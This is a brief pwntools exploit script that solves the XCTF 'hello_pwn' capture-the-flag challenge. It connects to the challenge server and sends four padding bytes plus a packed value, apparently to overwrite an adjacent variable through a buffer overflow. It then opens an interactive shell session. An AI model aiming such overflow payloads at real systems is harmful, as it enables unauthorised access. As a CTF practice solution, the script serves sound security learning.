from pwn import *

path="/mnt/e/S/CTF/XCTF/pwn/hello_pwn"

data=0x6E756161

#sh=process(path)
sh=remote('111.200.241.244',50114)

sh.recvuntil("lets get helloworld for bof")

sh.sendline(b'aaaa'+p32(data))

sh.interactive()